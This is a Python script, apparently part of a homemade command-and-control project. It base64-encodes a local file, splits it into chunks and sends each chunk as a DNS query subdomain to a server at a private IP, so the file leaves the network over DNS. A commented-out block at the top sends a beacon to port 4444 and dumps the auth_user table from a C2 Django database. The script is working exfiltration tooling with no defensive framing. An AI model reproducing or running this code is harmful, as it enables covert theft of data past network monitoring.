'''import socket
import datetime

host = '192.168.1.37'
port = 4444

clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientsocket.connect((host, port))

resp = ("Windows ->"+str(datetime.datetime.now()))
clientsocket.send(resp.encode('ascii'))

clientsocket.close()

import sqlite3

conn = sqlite3.connect("..\C2_Django\db.sqlite3")
cursor = conn.cursor()

print(cursor.execute("SELECT * from auth_user;").fetchall())
'''
import dnslib
import socket
import base64
import time

dns_server = '192.168.1.41'
domain_name = 'southpark.com'

def send_over_dns(data):
    domain_name = "southpark.com"
    resp = []
    for i in range(0, len(data), 32):
        if i+28 > len(data) - 1:
            resp.append(data[i:len(data)])
            break
        resp.append(data[i:i+32])
    resp.append(base64.b64encode(b"#END#"))
    for chunk in resp:
        ch = str(chunk).strip("'b")
        print(ch, end="\n")
        time.sleep(1)
        query = dnslib.DNSRecord.question(ch + '.' + domain_name)
        dns_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dns_socket.sendto(query.pack(), (dns_server, 53))
        response = dnslib.DNSRecord.parse(dns_socket.recv(4096))


encoded_data = None
with open('image.png', 'rb') as obj:
    data = obj.read()
    encoded_data = base64.b64encode(data)
    encoded_data = str(encoded_data).strip("'b")
send_over_dns(encoded_data)

'''
# Add the encoded data to the subdomain
query = dnslib.DNSRecord.question(encoded_data_str + '.' + domain_name)

# Send the DNS query to the DNS server
dns_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
dns_socket.sendto(query.pack(), (dns_server, 53))

response = dnslib.DNSRecord.parse(dns_socket.recv(4096))
'''